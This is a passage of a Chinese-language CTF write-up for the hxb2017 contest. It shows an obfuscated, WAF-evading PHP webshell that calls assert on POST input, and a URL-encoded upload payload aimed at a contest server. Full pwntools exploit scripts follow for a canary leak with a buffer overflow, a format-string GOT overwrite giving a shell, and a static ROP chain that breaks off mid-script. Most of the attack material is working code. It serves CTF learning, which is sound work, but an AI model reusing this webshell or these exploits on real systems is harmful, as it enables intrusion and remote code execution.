class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">'_'</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=$<span class="variable">$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><p>根据本题的 waf，还是需要绕过一下，@ 用来屏蔽错误，可以去掉，不影响功能。<br>用来获取 Array 字符串的双引号可以采用 $_=’’.[]; 来绕过。</p><p>最后可以绕过本题 waf 的 webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$_</span>=<span class="string">''</span>.[];<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'_'</span>==<span class="string">'__'</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">'_'</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure><p>编码后即可成功上传 webshell</p><p>最终 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://114.215.133.202:10080/index.php?content=%24_%3D%27%27.%5B%5D%3B%24_%3D%24_%5B%27_%27%3D%3D%27__%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="variable">$flag</span>=<span class="string">"=hxb2017&#123;51f759f39ac1f0cd5509b299b1d908f7&#125;"</span>; ?&gt;</span><br></pre></td></tr></table></figure><h1 id="PWN100"><a href="#PWN100" class="headerlink" title="PWN100"></a>PWN100</h1><p>把 pwns100 直接拖入 ida 中：<br>main函数：</p><p><img src="pwn100_1.png" alt></p><p>base64 解码函数</p><p><img src="pwn100_2.png" alt></p><p>输入函数</p><p><img src="pwn100_3.png" alt></p><p>可以看到 read 可以输入的字符串可以长达 0x200 个，这里可造成缓冲区溢出漏洞<br>这个程序很简单，输入 base64 字符串输出 base64 解码之后的字符串<br>先运行一下程序看一下这个程序干了啥：</p><p><img src="pwn100_4.png" alt></p><p>再看看程序开启了哪些保护：</p><p><img src="pwn100_5.png" alt></p><p>因为这个程序开了 Canary，这个题目的要利用 printf 泄露这个程序中的 Canary，然后再泄露 libc 的基地址，最后利用溢出重新布置栈空间 getshell。<br>因为每次 fork,子进程复制父进程的数据空间(数据段)、栈和堆，父、子进程共享正文段。也就是说，对于程序中的数据，子进程要复制一份，但是对于指令，子进程并不复制而是和父进程共享，具体可参考<a href="https://www.cnblogs.com/bwangel23/p/4190043.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4190043.html</a> 这个文章，所以虽然在泄露 Canary 或者 libc 的时候使子进程崩溃了，但是不会影响父进程的稳定性。<br>所以我的 exp 是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048B09'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = 0x0003AC69</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwns'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote('104.224.169.128', 18887)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getCanary</span></span><br><span class="line">payload = <span class="string">'a'</span>*0x102</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[268:271]</span><br><span class="line">Canary=<span class="string">"\x00"</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">"Canary:"</span>+hex(u32(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getlibc</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">'a'</span>*0x151</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[347:351]</span><br><span class="line">base_libc=u32(mylibc)-0x18637</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mylibc_addr:"</span>+hex(base_libc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc</span><br><span class="line">payload = <span class="string">'a'</span>*0x101+Canary+<span class="string">"a"</span>*0xc+p32(MAGIC_addr)</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>讲解一下如何获取 Canary，因为输入的输入数据会被 printf 输出，遇到 0x00 的时候停止输出，如果输入的输入刚刚好覆盖到 Canary 前面就可以用 printf 输出 Canary 了，但是 Canary 后两位是 0x00,所以得到输出之后要补足后两位的 0x00</p><p><img src="pwn100_6.png" alt></p><p>同理也可以用这种方法计算出__libc_start_main 和 libc 的基地址</p><p><img src="pwn100_7.png" alt></p><p>计算出 Canary 的值和基地址后，就可以通过溢出让程序程序跳转到 MAGIC 去了，就可以 getshell 了，至于 MAGIC 是啥，大家可以翻一下这篇文章：<a href="http://blog.csdn.net/niexinming/article/details/78512274" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78512274</a><br>最后的效果是：</p><p><img src="pwn100_8.png" alt></p><h1 id="PWN-200"><a href="#PWN-200" class="headerlink" title="PWN 200"></a>PWN 200</h1><p>把 pwns200 直接拖入 ida 中：<br>main 函数：</p><p><img src="pwn200_1.jpg" alt></p><p>sub_80485CD 函数：</p><p><img src="pwn200_2.jpg" alt></p><p>在 sub_80485CD 函数可以看到输入的数据直接进入了 printf 函数中，所以这个肯定是一个格式化字符串漏洞<br>先运行一下程序看一下这个程序干了啥</p><p><img src="pwn200_3.jpg" alt></p><p>再看看程序开启了哪些保护:</p><p><img src="pwn200_4.jpg" alt></p><p>这个程序开了 Canary 和栈不可执行<br>这个题目的思路和<a href="http://blog.csdn.net/niexinming/article/details/78512274" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78512274</a> 差不多，唯一不同的是上一个题目提供了 system 函数，这个题目要从 libc 中找 system 函数，所以首先通过 printf 打印__libc_start_main 函数这个地址，然后根据偏移计算 libc 的基地址，然后计算出 system 的实际地址，最后用 fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr}) 把 atio 的地址覆盖为 system 的地址，就可以 getshell 了。</p><p>我的exp是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x0804867E'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(r, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,offset):</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#localsystem = 0x0003ADA0</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('hackme.inndy.tw', 7711)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    info = r.recv().splitlines()[1]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"info:"</span>+info</span><br><span class="line">    r.sendline(<span class="string">'10'</span>)</span><br><span class="line">    <span class="comment">#r.close()</span></span><br><span class="line">    <span class="built_in">return</span> info</span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%x"</span> % atoi_got_addr</span><br><span class="line">system_offset_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%x"</span> % system_offset_addr</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">"%35<span class="variable">$p</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">libc_start_main = r.recv().splitlines()[1]</span><br><span class="line">libc_module=base_addr(libc_start_main,0x18637)</span><br><span class="line">system_addr=libc_module+system_offset_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">r.sendline(<span class="string">'10'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(autofmt.offset, &#123;atoi_got_addr: system_addr&#125;)</span><br><span class="line">r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#r.sendline('10')</span></span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>效果是：</p><p><img src="pwn200_5.jpg" alt></p><h1 id="PWN-300"><a href="#PWN-300" class="headerlink" title="PWN 300"></a>PWN 300</h1><p>把 pwn300 直接拖入 ida 中：<br>main 函数：</p><p><img src="pwn300_1.jpg" alt></p><p>add 函数：</p><p><img src="pwn300_2.jpg" alt></p><p>这个题目很有意思，首先开辟一个3到255大小的堆空间，然后做加减乘除的计算之后把计算结果放入堆中，最后可以把所有的计算结果用 memcpy 函数全部放入函数的临时变量 v5 中也就是栈中，这样就会造成栈溢出。<br>先运行一下程序看一下这个程序干了啥：</p><p><img src="pwn300_3.jpg" alt></p><p>再看看程序开启了哪些保护:</p><p><img src="pwn300_4.jpg" alt></p><p>看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做<br>这个题目用 ida 打开之后发现有很多函数，所以判断这个题目是静态编译</p><p><img src="pwn300_5.jpg" alt></p><p>所以可以用 <a href="http://blog.csdn.net/niexinming/article/details/78259866" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78259866</a> 中我提到的 ROPgadget 工具来做，不出意外，很成功的找了完整的 rop 链</p><p><img src="pwn300_6.jpg" alt></p><p>这个题目还有个难点就是不能直接输入十六进制，所以根据<a href="http://blog.csdn.net/niexinming/article/details/78666941" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78666941</a> 我的这篇文件可以用 ctypes.c_int32(0x123).value 进行转换<br>所以我的 exp 是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">import ctypes as ct</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048ff5'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,offset):</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/pwn300'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwn300'</span>)</span><br><span class="line"></span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line">p.append( 0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append( 0x080ea060)  <span class="comment"># @ .data</span></span><br><span class="line">p.append( 0x080bb406)  <span 